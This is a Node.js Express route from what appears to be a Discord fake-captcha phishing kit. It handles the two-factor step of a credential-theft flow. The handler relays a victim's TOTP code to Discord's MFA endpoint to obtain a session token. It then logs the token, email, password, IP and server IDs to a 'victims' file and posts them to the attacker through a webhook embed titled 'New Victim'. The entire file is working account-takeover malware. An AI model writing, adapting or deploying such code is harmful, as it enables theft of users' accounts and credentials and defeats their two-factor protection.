const fs = require('node:fs')
const path = require('node:path')

const express = require('express')
const app = express.Router()

const rate = require('../settings/rate-limit')
const fetch_discord = require('../../resources/functions/fetch discord')

const {
    MessageBuilder
} = require('discord-webhook-node')
const hook = require('../../resources/functions/webhook')

app.post('/mfa/totp', rate, async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
        const body = req.body

        if (body && !body.ref || !body.code) {
            return res.status(200).json({
                'status': 753
            })
        }

        const headers = {
            'Content-Type': 'application/json'
        }

        if (!body.ticket) {
            const js = JSON.parse(Buffer.from(Buffer.from(body.ref, 'base64').toString('utf-8'), 'base64').toString())
            body.ticket = (JSON.parse(await fs.promises.readFile(path.join(__dirname, '..', 'victims', 'log', `mfa-${js.clientId}.json`), 'utf-8'))).ticket
        }

        const api = await fetch_discord('https://discord.com/api/v9/auth/mfa/totp', {
            method: 'POST',
            headers: headers,
            body: JSON.stringify({
                "code": body.code,
                "ticket": body.ticket,
                "login_source": null,
                "gift_code_sku_id": null
            }, null, 3)
        })

        if (api && api.code === 60008 || api.code === '60008') {
            return res.status(200).json({
                'status': 0
            })
        }

        if (api && api.token) {
            const js = JSON.parse(Buffer.from(Buffer.from(body.ref, 'base64').toString('utf-8'), 'base64').toString())
            const dados = JSON.parse(await fs.promises.readFile(path.join(__dirname, '..', 'victims', 'log', `mfa-${js.clientId}.json`)))
            await fs.promises.appendFile(path.join(__dirname, '..', 'victims', 'tokens.txt'), `${api.token}:false:${dados.email}:${dados.password}:${ip}:${dados.guildId}:${dados.clientId}\n`)
            const embed = new MessageBuilder()
                .setTitle('New Victim')
                .setAuthor('PolarLofy', 'https://i.pinimg.com/564x/77/26/49/772649beefb024918c605ce0e8e4e048.jpg', 'https://github.com/opolarlofy/Discord-Fake-Captcha-Bot/tree/main')
                .addField('Token', '```' + api.token + '```', false)
                .addField('Mfa', '```' + '✅' + '```', false)
                .addField('Email', '```' + dados.email + '```', true)
                .addField('Password', '```' + dados.password + '```', true)
                .addField('Ip', '```' + ip + '```', true)
                .addField('Guild Id', '```' + dados.guildId + '```', true)
                .addField('Client Id', '```' + dados.clientId + '```', true)
                .setColor('#00b0f4')
                .setThumbnail('https://i.pinimg.com/564x/77/26/49/772649beefb024918c605ce0e8e4e048.jpg')
                .setFooter('PolarLofy', 'https://i.pinimg.com/564x/77/26/49/772649beefb024918c605ce0e8e4e048.jpg')
                .setTimestamp()
            await hook.send(embed)
            return res.status(200).json({
                'status': 1
            })
        } else {
            return res.status(200).json({
                'status': 0
            })
        }
    } catch (e) {
        return res.status(200).json({
            'status': 0
        })
    }
})

module.exports = (app)